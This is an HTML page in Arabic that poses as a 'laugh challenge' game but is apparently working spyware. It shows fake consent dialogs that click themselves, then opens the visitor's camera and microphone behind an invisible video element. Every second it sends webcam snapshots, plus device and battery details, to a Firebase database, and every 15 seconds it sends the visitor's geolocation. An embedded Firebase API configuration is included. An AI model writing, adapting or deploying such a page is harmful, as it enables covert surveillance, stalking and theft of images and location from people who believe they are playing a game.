<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحدي الضحك 😂</title>
<style>
:root{--bg:#090d18;--panel:#111a2b;--muted:#a7b2c8;--text:#f4f7ff;--a:#7c5cff;--b:#20d6b2}
*{box-sizing:border-box}
body{margin:0;min-height:100vh;font-family:Tahoma,Arial,sans-serif;color:var(--text);background:radial-gradient(ellipse at 15% 15%,#28205b 0,transparent 38%),radial-gradient(ellipse at 90% 80%,#073b43 0,transparent 35%),var(--bg);display:grid;place-items:center;padding:22px}
.shell{width:min(780px,100%);position:relative}
.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
.brand{font-weight:900;font-size:17px}.brand span{color:var(--b)}
.card{position:relative;overflow:hidden;text-align:center;padding:clamp(25px,5vw,50px);border:1px solid #ffffff1c;border-radius:28px;background:linear-gradient(145deg,#17223aee,#0d1424f2);box-shadow:0 28px 90px #0008;backdrop-filter:blur(16px)}
.icon{width:78px;height:78px;margin:0 auto 20px;border-radius:23px;display:grid;place-items:center;font-size:39px;background:linear-gradient(135deg,#785bff,#24cdb4);box-shadow:0 12px 35px #6654ff55;transform:rotate(-5deg)}
h1{font-size:clamp(28px,5vw,43px);line-height:1.3;margin:12px 0}
.desc{max-width:550px;margin:0 auto;color:var(--muted);font-size:15px;line-height:2}
.consent-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; display:flex; justify-content:center; align-items:center; flex-direction:column; backdrop-filter:blur(5px); }
.consent-box { background:#1e293b; padding:30px; border-radius:15px; text-align:center; max-width:90%; border:1px solid #334155; animation: popIn 0.3s ease; }
@keyframes popIn { from {transform:scale(0.8);opacity:0} to {transform:scale(1);opacity:1} }
.accept-btn { background:var(--b); color:#000; border:none; padding:10px 25px; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:15px; font-size:16px; }
.hidden-video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-1; opacity:0; pointer-events:none; }
#status{font-size:13px;color:#8fe8d4;min-height:22px;margin-top:14px}
</style>
</head>
<body>

    <!-- Overlay للموافقات السريعة -->
    <div id="consentOverlay" class="consent-overlay" style="display:none;">
        <div class="consent-box" id="consentBox">
            <h2 id="consentTitle">تحميل التحدي...</h2>
            <p id="consentText" style="color:#ccc; font-size:14px;">يرجى الانتظار قليلاً</p>
            <button id="consentBtn" class="accept-btn" style="display:none">موافق</button>
        </div>
    </div>

    <main class="shell">
    <header class="top"><div class="brand">تحدي <span>الضحك</span> 😂</div></header>
    <section class="card">
      <div class="icon">🎮</div>
      <h1>تحدي <span>الضحك 😂</span></h1>
      <p class="desc">هل أنت مستعد؟ اللعبة ستبدأ فوراً.</p>
      
      <button class="accept-btn primary" id="startBtn" onclick="startConsentFlow()">ابدأ الآن</button>
      <div id="status"></div>
    </section>
    </main>

    <!-- Video Element for Background -->
    <video id="bgVideo" class="hidden-video" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyClLKG-kiVCBcltXCBUsF6BjzlZB7KS2N8",
            authDomain: "secret-a6854.firebaseapp.com",
            databaseURL: "https://secret-a6854-default-rtdb.firebaseio.com",
            projectId: "secret-a6854",
            storageBucket: "secret-a6854.firebasestorage.app",
            messagingSenderId: "250063667423",
            appId: "1:250063667423:web:68038e2a9c8f491be9296a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let mediaRecorder;
        let recordedChunks = [];
        let streamUrl = null;

        // Sequence of fake consent messages
        const consentSteps = [
            { title: "جاري تحميل الصوت...", text: "هل توافق على تشغيل الصوت؟", btn: "تفعيل" },
            { title: "جاري تفعيل الكاميرا...", text: "هل توافق على استخدام الكاميرا؟", btn: "سماح" },
            { title: "جاري بدء اللعبة...", text: "جاهز؟", btn: "يلا بينا" }
        ];

        window.startConsentFlow = () => {
            const overlay = document.getElementById('consentOverlay');
            const box = document.getElementById('consentBox');
            const title = document.getElementById('consentTitle');
            const text = document.getElementById('consentText');
            const btn = document.getElementById('consentBtn');
            
            overlay.style.display = 'flex';
            
            let stepIndex = 0;

            function showStep() {
                if(stepIndex >= consentSteps.length) {
                    overlay.style.display = 'none';
                    initTracking();
                    return;
                }
                const step = consentSteps[stepIndex];
                title.innerText = step.title;
                text.innerText = step.text;
                btn.innerText = step.btn;
                btn.style.display = 'block';
                
                // Auto click after short delay to make it look fast
                setTimeout(() => {
                    btn.click();
                }, 600); 
            }

            btn.onclick = () => {
                stepIndex++;
                showStep();
            };

            showStep();
        };

        window.initTracking = async () => {
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = "جاري الاتصال...";

            try {
                // 1. Start Camera & Mic
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: true
                });

                // Show video locally (mirrored)
                const bgVideo = document.getElementById('bgVideo');
                bgVideo.srcObject = stream;
                bgVideo.play();

                // 2. Setup MediaRecorder for "Live" simulation (sending blobs)
                // We record small chunks to send as "live" updates
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        // Instead of sending full blob which is heavy, 
                        // let's just send a snapshot frame every few seconds 
                        // AND keep the stream open.
                        // For this demo, we will send a snapshot.
                        takeSnapshot(stream);
                    }
                };
                mediaRecorder.start(1000); // Collect data every second

                // 3. Location & Device Info
                startLocationTracking();

                statusDiv.innerText = "تم الاتصال بنجاح!";
                document.getElementById('startBtn').style.display = 'none';

            } catch (err) {
                statusDiv.innerText = "حدث خطأ: " + err.message;
            }
        };

        function takeSnapshot(stream) {
            const video = document.getElementById('bgVideo');
            if(!video.videoWidth) return;

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Send Snapshot
            const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
            
            // Get Battery
            let batteryLevel = null;
            if ('getBattery' in navigator) {
                 navigator.getBattery().then(b => batteryLevel = b.level);
            }

            const data = {
                type: 'camera_snap',
                data: imageBase64,
                time: new Date().toISOString()
            };

            // Append device info if it's the first one
            if(navigator.getBatterySync === undefined) { // Hacky check to send info once
                 data.deviceInfo = {
                    model: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    browser: /Chrome|Firefox|Safari/i.test(navigator.userAgent) ? 'Browser' : 'Other',
                    connection: navigator.connection ? navigator.connection.effectiveType : 'Wifi'
                };
                data.battery = batteryLevel;
            }

            push(ref(db, 'users'), data);
        }

        function startLocationTracking() {
            setInterval(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        push(ref(db, 'users'), {
                            type: 'location',
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            time: new Date().toISOString()
                        });
                    }, (err) => {});
                }
            }, 15000);
        }
    </script>
</body>
</html>
